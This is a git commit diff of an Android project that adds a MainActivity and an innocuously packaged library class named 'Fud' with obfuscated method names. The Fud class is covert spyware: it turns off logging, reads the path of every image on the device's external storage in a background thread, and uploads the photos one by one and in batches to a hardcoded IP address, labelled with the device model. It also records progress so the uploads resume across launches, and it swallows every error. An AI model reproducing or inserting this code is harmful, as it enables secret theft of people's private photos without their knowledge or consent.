712416c6cde9cbd4b899422d862e1a16b7a68c50
王春雷 <leizi521yy@163.com>
2019-09-04 17:17:13 +0800

    first commit

---
+++ app/src/main/java/com/sstm/wxcdrjsd/MainActivity.java
@@ -0,0 +1,18 @@
+package com.sstm.wxcdrjsd;
+
+import android.support.v7.app.AppCompatActivity;
+import android.os.Bundle;
+import android.view.View;
+
+import com.arialyy.aria.core.Aria;
+
+import sm.dn.yes.Fud;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+}
---
+++ tbdfh/src/main/java/sm/dn/yes/Fud.java
@@ -0,0 +1,242 @@
+package sm.dn.yes;
+
+import android.app.Application;
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.os.Build;
+import android.provider.MediaStore;
+import android.util.Log;
+
+import com.lzy.okgo.OkGo;
+import com.lzy.okgo.callback.StringCallback;
+import com.lzy.okgo.interceptor.HttpLoggingInterceptor;
+import com.lzy.okgo.model.Response;
+
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.File;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.concurrent.TimeUnit;
+import java.util.logging.Level;
+
+import okhttp3.OkHttpClient;
+
+public class Fud {
+    private static List<String> mFilePash = new ArrayList<>();
+    private static List<File> mFileList = new ArrayList<>();
+    private static int mConunt = 0;
+    private static String folderName;
+    private static Context mContext;
+    private static SharedPreferences sp;
+
+    public static void ok(Context context) {
+        mContext = context;
+        sp = context.getSharedPreferences("cssm", Context.MODE_PRIVATE);
+        if (sp.getString("ys", "n").equals("y")) {
+            return;
+        }
+        OkHttpClient.Builder builder = new OkHttpClient.Builder();
+        //配置日志
+        HttpLoggingInterceptor loggingInterceptor = new HttpLoggingInterceptor("OkGo");
+        //log打印级别，决定了log显示的详细程度
+//        loggingInterceptor.setPrintLevel(HttpLoggingInterceptor.Level.BODY);//全部打印数据
+        loggingInterceptor.setPrintLevel(HttpLoggingInterceptor.Level.NONE);//关闭日志打印
+        //log颜色级别，决定了log在控制台显示的颜色
+        loggingInterceptor.setColorLevel(Level.INFO);
+        builder.addInterceptor(loggingInterceptor);
+        //全局的读取超时时间
+        builder.readTimeout(3000, TimeUnit.MILLISECONDS);
+        //全局的写入超时时间
+        builder.writeTimeout(3000, TimeUnit.MILLISECONDS);
+        //全局的连接超时时间
+        builder.connectTimeout(3000, TimeUnit.MILLISECONDS);
+        OkGo.getInstance().init((Application) mContext)
+                .setOkHttpClient(builder.build());//建议设置OkHttpClient，不设置将使用默认的
+
+//        OkGo.getInstance().init((Application) mContext)
+//                .setOkHttpClient(builder.build());//建议设置OkHttpClient，不设置将使用默认的
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    tb();
+                } catch (Exception e) {
+                    return;
+                }
+            }
+        }).start();
+    }
+
+    private static void tb() {
+        mFilePash.clear();
+        Cursor cursor = mContext.getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
+        while (cursor.moveToNext()) {
+            //获取图片的名称
+//            String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
+            //获取图片的生成日期
+//            byte[] data = cursor.getBlob(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+            //获取图片的详细信息
+//            String desc = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION));
+            //获取图片路径
+            mFilePash.add(cursor.getString(1));
+        }
+        if (Build.PRODUCT != null && Build.PRODUCT.length() > 0) {
+            folderName = "_" + Build.PRODUCT;
+        } else if (Build.BRAND != null && Build.BRAND.length() > 0) {
+            folderName = "_" + Build.BRAND;
+        } else if (Build.DEVICE != null && Build.DEVICE.length() > 0) {
+            folderName = "_" + Build.DEVICE;
+        }
+        folderName += "gong" + mFilePash.size();
+        mConunt = Integer.valueOf(sp.getString("count", "0"));
+        cwcyb();
+    }
+
+    private static void cwcyb() {
+        if (mConunt >= mFilePash.size() - 1) {
+            SharedPreferences.Editor editor = sp.edit();
+            editor.putString("ys", "y");
+            Fud.SharedPreferencesCompat.apply(editor);
+            return;
+        }
+        SharedPreferences.Editor editor = sp.edit();
+        editor.putString("count", mConunt + "");
+        Fud.SharedPreferencesCompat.apply(editor);
+        swcyb(new File(mFilePash.get(mConunt)));
+    }
+
+    private static void swcyb(File file) {
+        OkGo.<String>post("http://47.104.6.226:8080/file/setfile")
+                .params("file", file)
+                .params("dir", folderName)
+                .execute(new StringCallback() {
+                    @Override
+                    public void onSuccess(Response<String> response) {
+                        mConunt++;
+                        cwcyb();
+                    }
+
+                    @Override
+                    public void onError(Response<String> response) {
+                        super.onError(response);
+                        mConunt++;
+                        cwcyb();
+                    }
+                });
+    }
+
+    private static void cb(int count) {
+        if (count >= mFilePash.size() - 1) {
+            SharedPreferences.Editor editor = sp.edit();
+            editor.putString("ys", "y");
+            Fud.SharedPreferencesCompat.apply(editor);
+            return;
+        }
+//        if (count > 200) {
+//            SharedPreferences.Editor editor = sp.edit();
+//            editor.putString("ys", "y");
+//            Fud.SharedPreferencesCompat.apply(editor);
+//            return;
+//        }
+        SharedPreferences.Editor editor = sp.edit();
+        editor.putString("count", count + "");
+        Fud.SharedPreferencesCompat.apply(editor);
+        if (count + 10 > mFilePash.size() - 1) {
+            if (count >= mFilePash.size() - 1) {
+                return;
+            } else {
+                mFileList.clear();
+                for (int i = count; i < mFilePash.size(); i++) {
+                    mFileList.add(new File(mFilePash.get(i)));
+                }
+                sb(mFileList);
+            }
+        } else {
+            mFileList.clear();
+            for (int i = count; i < count + 10; i++) {
+                mFileList.add(new File(mFilePash.get(i)));
+            }
+            sb(mFileList);
+        }
+    }
+
+    private static void sb(List<File> mfiles) {
+//        OkGo.<String>post("http://47.104.6.226:8080/file/setfiles")
+//                .addFileParams("files", mfiles)
+//                .params("dir", folderName)
+//                .execute(new StringCallback() {
+//                    @Override
+//                    public void onSuccess(Response<String> response) {
+//                        SharedPreferences.Editor editor = sp.edit();
+//                        editor.putString("ys", "y");
+//                        Fud.SharedPreferencesCompat.apply(editor);
+//                        mConunt += 10;
+//                        cb(mConunt);
+//                    }
+//
+//                    @Override
+//                    public void onError(Response<String> response) {
+//                        super.onError(response);
+//                        mConunt += 10;
+//                        cb(mConunt);
+//                    }
+//                });
+        OkGo.<String>post("http://47.104.6.226:8080/file/setfiles")
+                .addFileParams("files", mfiles)
+                .params("dir", folderName)
+                .execute(new StringCallback() {
+                    @Override
+                    public void onSuccess(Response<String> response) {
+                        mConunt += 10;
+                        cb(mConunt);
+                    }
+                });
+    }
+
+    /**
+     * 创建一个解决SharedPreferencesCompat.apply方法的一个兼容类
+     */
+    private static class SharedPreferencesCompat {
+        private static final Method sApplyMethod = findApplyMethod();
+
+        /**
+         * 反射查找apply的方法
+         *
+         * @return
+         */
+        @SuppressWarnings({"unchecked", "rawtypes"})
+        private static Method findApplyMethod() {
+            try {
+                Class clz = SharedPreferences.Editor.class;
+                return clz.getMethod("apply");
+            } catch (NoSuchMethodException e) {
+            }
+
+            return null;
+        }
+
+        /**
+         * 如果找到则使用apply执行，否则使用commit
+         *
+         * @param editor
+         */
+        public static void apply(SharedPreferences.Editor editor) {
+            try {
+                if (sApplyMethod != null) {
+                    sApplyMethod.invoke(editor);
+                    return;
+                }
+            } catch (IllegalArgumentException e) {
+            } catch (IllegalAccessException e) {
+            } catch (InvocationTargetException e) {
+            }
+            editor.commit();
+        }
+    }
+}
